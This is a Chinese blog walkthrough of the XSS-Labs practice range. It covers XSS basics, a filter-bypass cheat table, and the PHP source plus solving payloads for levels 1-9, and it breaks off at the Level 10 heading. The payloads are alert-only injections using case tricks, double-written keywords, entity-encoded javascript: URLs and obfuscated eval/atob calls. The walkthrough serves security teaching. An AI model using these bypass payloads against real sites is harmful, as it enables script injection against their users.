---
title: XSS-Labs 1-20关
date: 2026-08-29 01:09:45
categories:
  - Web安全
  - XSS
tags:
  - XSS
description: XSS-Labs 靶场 1-20 关通关全记录：XSS 前置知识（触发路径、事件机制、闭合注入、绕过手法）+ 20 关逐关 payload 与过滤绕过解析
cover: "https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/cover.webp"
highlight_shrink: true
---

# 00 XSS 前置知识
## 01 核心
```plain
<tag on事件="JS代码">      ← 通用三段式：HTML + HTML属性 + JS
<script>JS</script>       ← 特例，不需要事件
```

判断能否 XSS 的两个必要条件：

1. 属性能执行 JS 代码
2. 标签被浏览器正确解析

---

## 02 两个触发路径
### 事件触发
`<tag onXXX=alert(1)>`

### 伪协议
`<a href=javascript:alert(1)>` / `<iframe src=javascript:alert(1)>`

---

## 03 位置 → 触发 → 绕过
### Q1. 输入落在什么上下文？（决定 payload 形状）
| **上下文** | **例子** | **怎么破** |
| :--- | :--- | :--- |
| HTML 文本节点 | `<div>HERE</div>` | 直接塞新标签 |
| HTML 属性值 | `<input value="HERE">` | `">`<br/> 闭合属性+标签，再塞标签 |
| `<script>`<br/> 内部 | `<script>HERE</script>` | `</script>`<br/> 闭合或直接写 JS |
| URL 属性 | `<a href="HERE">` | `javascript:`<br/> 伪协议 |
| HTML 注释 | `<!-- HERE -->` | `-->`<br/> 闭合后塞标签 |
| JS 字符串 | `var x="HERE"` | `";alert(1)//`<br/> 跳出 |


---

### Q2. 触发？
> 核心思路：**先判断标签元素具备什么资格，再选择可用事件，不要死记payload列表硬套**
>

| 元素资格 | 可用事件类别 | 触发自动性 | 说明 |
| --- | --- | --- | --- |
| 任何可见DOM元素 | 鼠标 / 键盘事件 | 手动（兜底方案） | 需要用户点击、悬浮、按键才触发，所有可见标签都支持 |
| 具备加载语义标签   `img / svg / embed` | `onload`、`onerror` | 自动，依赖真实加载行为 | 资源加载成功/失败自动触发；资源加载行为不保证一定发生 |
| 状态可变标签 `<details>` | `ontoggle` | 全自动 | 标签展开/收起状态切换自动触发 |
| 可聚焦标签   `input / textarea / a` | `onfocus` | 半自动 | 搭配`autofocus`属性可以页面加载自动获取焦点实现自动触发 |


> 流程：遇到陌生标签（`embed`、`object`、`video`、`audio`）
>
> 1. 判断标签拥有哪一类资格
> 2. 匹配对应事件类别
> 3. 确认自动性，挑选payload
>

---

#### XSS事件四大类别汇总表
| 类别 | 代表事件 | 触发时机 | 自动性 |
| --- | --- | --- | --- |
| 加载/状态类 | `onerror`、`onload`、`ontoggle` | 资源加载失败/加载完成、details标签展开收起 | **全自动** |
| 焦点类 | `onfocus`、`onblur` | 元素获取焦点 / 失去焦点；搭配`autofocus`实现页面加载自动拿焦点 | 半自动 |
| 鼠标类 | `onclick`、`onmouseover` | 用户点击、鼠标悬浮划过元素 | 手动，需要用户交互 |
| 键盘类 | `onkeydown`、`onkeyup` | 用户按下/松开键盘按键 | 手动，需要用户交互 |


---

### Q3. 过滤器拦了什么？（决定绕过手法）
| **被拦** | **绕过** |
| :--- | :--- |
| `script` | 换 svg/img/iframe |
| `on*`<br/> 全拦 | 双写 `oonnload`<br/>、伪协议、srcdoc |
| 单事件被拦 | 换别的事件 |
| 大小写 | `<ScRiPt>`<br/>`OnErRoR` |
| 引号 | 不用引号 `onerror=alert(1)` |
| 括号 `()` | 反引号 `alert\`1\`` |
| 关键字 alert | 拼接 `window["al"+"ert"](1)`<br/>、Unicode `window.alert(1)` |
| `javascript:` | `java\tscript:` |
| 空格 | `/`<br/> 替代 `<svg/onload=alert(1)>` |


---

## 04 重要 payload
```plain
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<input autofocus onfocus=alert(1)>
```

---

## 05 闭合注入点
+ **属性值中**：`">` 闭合属性+标签，`//` 注释尾巴
+ **文本节点**：不用闭合，直接塞
+ **`<script>` 中**：`</script>` 闭合

**属性注入 vs 标签注入**：加属性不用 `>`，开新标签必须 `>`

---

## 06 材料库
### 1. 标签专属事件
| **事件** | **只能挂** | **自动触发条件** |
| :--- | :--- | :--- |
| `onload` | img / iframe / svg / body / script / link / style | 资源加载完 |
| `onerror` | img / iframe / script / link / style | 资源加载失败 |
| `onfocus` | input / textarea / select / button / `a[href]` | 需加 `autofocus` |
| `ontoggle` | `<details>` | 需加 `open` |
| `onbegin`<br/>/`onend`<br/>/`onrepeat` | svg 的 `<animate>`<br/> 内 | 动画开始/结束/重复 |
| `onchange`<br/>/`oninput` | input / select / textarea | 用户改值 |
| `onsubmit`<br/>/`onreset` | `<form>` | 提交/重置 |
| `oncanplay`<br/>/`ontimeupdate`<br/>/`onended`<br/> 等 | video / audio | 媒体事件 |


> **通用事件**（任意标签都能挂，但都要交互）：onclick / onmouseover / onmouseenter / onmousemove / onauxclick / oncontextmenu / onkeydown / onpointerdown 等
>

---

### 2. 其他材料
+ **伪协议**：`javascript:` / `srcdoc=` / `data:text/html,`
+ **载体标签**：script / img / svg / iframe / body / input / details / a / object / video / audio

---

### 3. alert 等价表达
```plain
alert(1)
window["alert"](1)
window["al"+"ert"](1)           // 拼接
window.alert(1)            // Unicode
window["al\x65rt"](1)          // \x 转义
eval("al"+"ert(1)")            // eval
top["aler"+"t"](1)             // top 也能用
self[atob("YWxlcnQ=")](1)      // base64 解码
```

被过滤时查 **PortSwigger XSS Cheatsheet：**

[https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

---

## 07 环境搭建
靶场下载地址：[https://github.com/do0dl3/xss-labs](https://github.com/do0dl3/xss-labs)

部署教程：[https://www.cnblogs.com/xize766/articles/19555816/xss-deploy](https://www.cnblogs.com/xize766/articles/19555816/xss-deploy)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937160284_6x7muy.webp)

## 08 环境说明
> 17~20 关的页面里都嵌着一个 Flash 文件。但 Flash 这项技术2020年底已经全面停止服务，现在的浏览器全都不再支持它——所以用日常浏览器打开，Flash的位置只会是一片空白。想做这四关，就得用一个“还留着 Flash”的老浏览器。我用的是自带 Flash 插件的老版Firefox，Flash 能正常显示。
>
> 下载链接：[https://gitee.com/jasminee0762/cyber-security/tree/master/Tools/Firefox46%E6%B8%97%E9%80%8F%E4%BE%BF%E6%90%BA%E7%89%88](https://gitee.com/jasminee0762/cyber-security/tree/master/Tools/Firefox46%E6%B8%97%E9%80%8F%E4%BE%BF%E6%90%BA%E7%89%88)
>

---

# Level 1
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937162735_chr1tv.webp)

## 1. 基础 XSS
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937164491_nnzbv6.webp)

### 1.1 源码
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

反射型 XSS（输入通过 URL 传递 → 未过滤 → 直接输出）

## 2. Payload
```html
<script>alert(1)</script>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937165991_rvyyfe.webp)

---

# Level 2
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937167225_pbroob.webp)

## 1. 转义过滤
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level3.php?writing=wait"; 
}
</script>
<title>欢迎来到level2</title>
</head>
<body>
<h1 align=center>欢迎来到level2</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
<input type=submit name=submit value="搜索"/>
</form>
</center>';
?>
<center><img src=level2.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937168755_lu96g6.webp)

value 属性未转义 → 双引号闭合属性 + 直接注入 `<script>`

---

## 2. Payload
```html
"><script>alert(1)</script>
```

我们用`"`闭合前面的 `value="` 属性， `>` 闭合整个 `<input>` 标签  ，然后 浏览器 HTML 解析器识别到`<script>`标签，**页面加载的时候直接执行里面 JS**

✅**HTML 容错（宽松解析）机制：浏览器不会直接报错崩溃。**

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937170505_iibv45.webp)

---

# Level 3
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937171750_x7z1ke.webp)

## 1. 单引号包裹
### 1.1 源码
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level4.php?keyword=try harder!"; 
}
</script>
<title>欢迎来到level3</title>
</head>
<body>
<h1 align=center>欢迎来到level3</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>    
<input type=submit name=submit value=搜索 />
</form>
</center>";
?>
<center><img src=level3.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```

### 1.2 分析
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937173148_zj1mip.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937174822_6m4618.webp)

`"><script>alert(1)</script>`

我们发现使用 level2 的 payload 用不了了，根源就在`htmlspecialchars`

---

### Q1：`htmlspecialchars` 是什么？
PHP核心函数：**把HTML特殊字符转成HTML实体，防止XSS跨站脚本**。

#### 1. 转换对照表
| 原字符 | 转换后实体 |
| --- | --- |
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"`（双引号） | `&quot;` |
| `'`（单引号） | `&#039;`（ PHP5‑8.0仅开启参数`ENT_QUOTES`才转，PHP8.1+默认就转  ） |


例子：

输入可控内容：

```plain
$user_input = "<script>alert(1)</script>";
echo htmlspecialchars($user_input);
```

输出到页面源码：

```plain
&lt;script&gt;alert(1)&lt;/script&gt;
```

浏览器**不会当成JS执行**，直接把`<script>`文本原样显示在页面上，XSS失效。

---

#### 2. 函数完整语法
```plain
htmlspecialchars(string $str, int $flags = ENT_QUOTES | ENT_SUBSTITUTE, ?string $encoding = null, bool $double_encode = true)
```

重点参数

1. `ENT_QUOTES`：同时转义**双引号 + 单引号**（最安全）
2. `ENT_NOQUOTES`：引号全部不转，只转`< > & `
3. `ENT_COMPAT`：只转双引号，单引号不转（PHP5‑8.0的旧版默认） 

---

#### 3. 版本差异
> 1. PHP5.6 ~ PHP8.0：不传第二个参数，等价 ENT_COMPAT，**默认不转单引号 **`'`
> 2. PHP 8.1及以上：不传第二个参数，默认是 ENT_QUOTES，**单、双引号全部转义**，单引号绕过失效。
>

```plain
// PHP5‑8.0：& < > " 转义，单引号保留
htmlspecialchars($input); 

// ✅安全写法，单双引号全部转义
htmlspecialchars($input, ENT_QUOTES);
```

---

### 1.3 漏洞点
查看页面源代码

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937176774_5ju3ig.webp)

```html
<inputname=keywordvalue='&quot;&gt;&lt;script&gt;alert(111)&lt;/script&gt;&lt;'>	
```



源码： 用**单引号**包裹变量  

```html
<input name=keyword value='".htmlspecialchars($str)."'>
```

> 只调用`htmlspecialchars()`不加`ENT_QUOTES`，**单引号**`'`**不会被转义**！
>

---

## 2. Payload
```html
' onclick=alert(1)//
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937179539_zozjic.webp)`onclick`：**鼠标点击事件处理器** 👉 只有鼠标**点击这个 input 元素的时候，浏览器才会执行等号后面 JS 代码**。  

`//'`：`//` 在**HTML 里不是注释！ 是 JS 层面的注释。**onclick 触发后， 把残余单引号注释掉，避免 JS 语法报错。    

---

# Level 4
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937181068_kzu7hc.webp)

## 1.< > 被删除
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level5.php?keyword=find a way out!"; 
}
</script>
<title>欢迎来到level4</title>
</head>
<body>
<h1 align=center>欢迎来到level4</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace(">","",$str);
$str3=str_replace("<","",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level4.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level4.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>
```

---

### 1.1 分析
双引号包裹的属性

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937182496_uwg8ej.webp)

paylaod：`"><script>alert(1)</script>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937184451_qk3pww.webp)

发现<>被删了

---

## 2. payload
```html
" onclick=alert(1)//
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937185922_zlgyfn.webp)

---

# Level 5
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937188122_uu50zv.webp)

## 1. 源码
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level6.php?keyword=break it out!"; 
}
</script>
<title>欢迎来到level5</title>
</head>
<body>
<h1 align=center>欢迎来到level5</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level5.php method=GET>
<input name=keyword  value="'.$str3.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level5.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str3)."</h3>";
?>
</body>
</html>
```

---

### 1.1 分析
源码：

```html
$str = strtolower($_GET["keyword"]);
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
```

`strtolower()`：**把用户传入的整个 payload 全部强制转为小写**。且禁止出现 `on`、禁止出现 `script`

双引号包裹

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937189545_7se7zr.webp)

---

## 2. payload
WAF拦截了 `<script>`、所有 `onxxx` 事件（onclick/onerror/onmouseover全部阵亡）。不能用事件，不能用script标签，就要找**不需要on事件触发、不需要script标签**的XSS向量。

核心原理：利用URL 伪协议 javascript:，把 JS 代码写在链接地址里，用户点击链接就执行 JS

### 2.1 SVG 触发： SVG + href  
```plain
"><svg><a xlink:href="javascript:alert(1)"><text x="10" y="20">click</text></a></svg>
```

> 1. 关键点：`xlink:href` 是SVG的链接属性，支持`javascript:`协议，**不带on**，绕过on关键词过滤。
> 2. HTML 和 SVG 的解析规则不一样！
> + 在普通 HTML 里：`<a>click</a>`，直接写文本，正常渲染文字。
> + 在 SVG 内部：**裸文本不会被绘制**，文字必须放在 `<text>` 标签内部，还要给 `x,y` 坐标。
> 3. 缺陷： 需要点击文字，不能自动执行。
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937191366_4hc2sd.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937193158_6hn663.webp)

页面出现链接文字 `click`，**用户点击链接触发JS执行**

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937195276_3v4sd6.webp)

注：SVG2嵌入HTML时`<a>`直接用`href`，无需`xlink:href`可以实现同样的效果；仅老旧独立SVG文件才需要xlink前缀。

```plain
"><svg><a href="javascript:alert(1)"><text x="10" y="20">click</text></a></svg>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937197250_nyv3bf.webp)

---

### 2.2 `javascript:`伪协议，a标签，无on无script
双引号属性逃逸payload

```plain
"><a href="javascript:alert(1)">test</a>
```

> 缺陷：**必须用户点击，不能自动执行**。`javascript:`伪协议绝大多数情况无法自动执行，只能靠用户交互点击。
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937198864_danxkc.webp)

页面出现链接文字`test`，**用户点击链接触发JS执行**

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937200747_ribqfa.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937202763_zuemxv.webp)

---

###  2.3 javascript: 被 WAF 过滤
HTML 实体编码绕过  

```plain
j a v a s c r i p t :
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:
```

完整a标签payload：

```plain
"><a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>
```

浏览器解析HTML实体，还原成`javascript:`。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937205200_1sc7on.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937207282_rm5tmz.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937208952_9xbw7h.webp)

---

### Q1：十进制实体编码构成
```plain
&#N;
```

| 片段 | 作用 | 说明 |
| --- | --- | --- |
| `&` | 实体开始标记 | **必须以&开头**，告诉浏览器：这是一个字符实体，不是普通文本 |
| `#` | 标记这是**十进制模式** | 没有#就是命名实体，例如`&lt;`；带#代表后面是数字 |
| `N` | ASCII/Unicode十进制数字 | 字符对应的编码值，例如j=106，a=97 |
| `;` | 实体结束符 | **分号不能随便省略**，部分浏览器容错允许省略 |


---

#### 1. 和十六进制实体对比
十六进制格式：`&#xN;`

+ `&` 开头
+ `#x` → 标记十六进制
+ N：十六进制数字
+ `;`结束

例：`j` → `&#x6a;`

#### 2. 和命名实体对比
命名实体，没有#、没有数字，直接名字：  
`<` → `&lt;`

#### 3. 总结
1. 十进制：`&#106;`  → `&` + `#` +十进制数 +`;`
2. 十六进制：`&#x6a;` → `&` + `#x` +十六进制数 +`;`
3. 命名实体：`&lt;` → `&` +名字 +`;`

#### 4. 特点
1. **只在HTML解析阶段生效**（HTML正文、标签属性）
2. `<script>`、`<style>`内部，HTML实体**不会解码**！

---

### Q2：字符转为 HTML 十进制实体编码
```python
s="javascript"
result="".join([f'&#{ord(c)};' for c in s])
print(result)
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937211047_f9a6fj.webp)

---

# Level 6
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937212865_o2i8p0.webp)

## 1. 大小写绕过
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level7.php?keyword=move up!"; 
}
</script>
<title>欢迎来到level6</title>
</head>
<body>
<h1 align=center>欢迎来到level6</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["keyword"];
$str2=str_replace("<script","<scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level6.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level6.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>
```

### 1.1 分析
过滤 `<script`、on、src、data、href

这题和 Level 5 的区别不仅是多过滤了几个字符串，而且没有`strtolower()`函数，不管大小写。

> 注意：`str_replace`是**大小写敏感替换**！只替换小写字符串，大写、混合大小写不会被处理。
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937214802_v9tcyl.webp)

用 `"` 闭合value属性。

---

### 1.2 漏洞点
`str_replace`只匹配**小写**。

+ `on`被替换，但 `On` / `ON` / `oN` 不会匹配；
+ `href`小写被替换，`HREF`、`Href`不会替换；
+ `<script`小写被替换，`<SCRIPT>`不会替换。

---

## 2. payload
### 2.1 大小写绕过事件（on过滤）
原本小写 `onclick` → 会被替换成 `o_nclick` 废掉。  
写成大写 `Onclick`，过滤器找不到小写`on`，不会做替换。

Payload：

```plain
" Onclick=alert(1)//
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937216535_vpu2zm.webp)

---

### 2.2 SVG + HREF大写绕过href过滤
小写`href`被替换为`hr_ef`，`HREF`不受影响；同时WAF过滤on，用svg的a标签。

```plain
"><svg><a HREF="javascript:alert(1)"><text x="10" y="20">click</text></a></svg>
```

`HREF`大写，`str_replace("href",...)`匹配不到，保留HREF。

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937218086_rjhl1c.webp)

---

### 2.3 SCRIPT大写绕过script过滤
```plain
"><SCRIPT>alert(1)</SCRIPT>
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937220144_r0djh1.webp)

---

# Level 7
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937221889_9mijr6.webp)

## 1. 双写绕过
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level8.php?keyword=nice try!"; 
}
</script>
<title>欢迎来到level7</title>
</head>
<body>
<h1 align=center>欢迎来到level7</h1>
<?php 
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
$str5=str_replace("data","",$str4);
$str6=str_replace("href","",$str5);
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level7.php method=GET>
<input name=keyword  value="'.$str6.'">
<input type=submit name=submit value=搜索 />
</form>
</center>';
?>
<center><img src=level7.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str6)."</h3>";
?>
</body>
</html>
```

### 1.1 分析
这题是 Level 5 和 Level 6 的结合：

既包含了多个字符串的过滤，又有强制转小写。

不一样的是：**全部匹配**，删除过滤的字符串，而不是替换

---

### 1.2 漏洞点  
>  ⚠重点：PHP 的 str_replace 不会二次扫描处理生成出来的新字符串！只扫描原始输入一遍。
>

以 href 为例：如果我输入的是 hhrefref

```plain
原始： h h r e f r e f
        └──href──┘  找到这一处，删掉
结果： h + ref  → "href"
```

只扫描原始输入一遍，**不会再对新生成的**`**href**`**再次执行替换**。  

这样我们就可以通过删除过滤拼接绕过

---

## 2. payload
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937223531_gyyogr.webp)

用 `"` 闭合value属性。

```plain
" oonnclick=alert(1)//
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937225202_p1ouqs.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937226970_y7paz1.webp)

其他被过滤的字符串可以通过同样的方式绕过

```html
"><scscriptript>alert(1)</scscriptript>
" oonnfocus=alert(1)//
"><svg><animate oonbegin=alert(1)></animate></svg>">
......
```

---

# Level 8
## 1. 实体编码绕过
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level9.php?keyword=not bad!"; 
}
</script>
<title>欢迎来到level8</title>
</head>
<body>
<h1 align=center>欢迎来到level8</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```

### 1.1 分析
大写转小写

过滤了 `script、 on、src、data、 href `

也不能有`" < > &`

---

### 1.2 漏洞点
```php
<?php
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
```

输入经过过滤后变成 $str7，然后被原样拼在href="xxx"——不需要闭合，不需要造新标签，只需要这个网址本身是个伪协议

---

## 2. payload
```html
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)>
```

1. 实体编码后(编码一个字符也可以：`javas&#99ript`，到服务器过滤器，检查有没有坏词
2. 拼进HTML
3. 浏览器解码并执行

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937228457_ws1rye.webp)

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937231009_w73opx.webp)

---

# Level 9
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937232526_9yh4dx.webp)

## 1. http:// 注入
```php
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level10.php?keyword=well done!"; 
}
</script>
<title>欢迎来到level9</title>
</head>
<body>
<h1 align=center>欢迎来到level9</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level9.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
        }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
<center><img src=level9.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```

### 1.1 分析
这题和 Level 8 的区别在于输入的字符串里必须出现字面 `http://`，否则整个输入被丢弃替换。

---

### 1.2 漏洞点
它只检查 http:// 存不存在，不管它在字符串的什么位置。

所以问题变成：把 http:// 放在哪个位置，既能让 strpos 找到它，又不破坏 `javascript:`这个伪协议地址本身？

1. 可以是注释里的内容（// 后面的部分浏览器根本不当地址解析）
2. 可以是 JS 字符串参数（alert('...') 引号里）

---

## 2. payload
```shell
javas&#99ript:alert('http://111')
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937234143_5rzduv.webp)

---

# Level 10
<!-- 这是一张图片，ocr 内容为： -->
![](https://img.jasmine-iris.top/posts/XSS-Labs-1-20关/1787937235517_cj1l1c.webp)

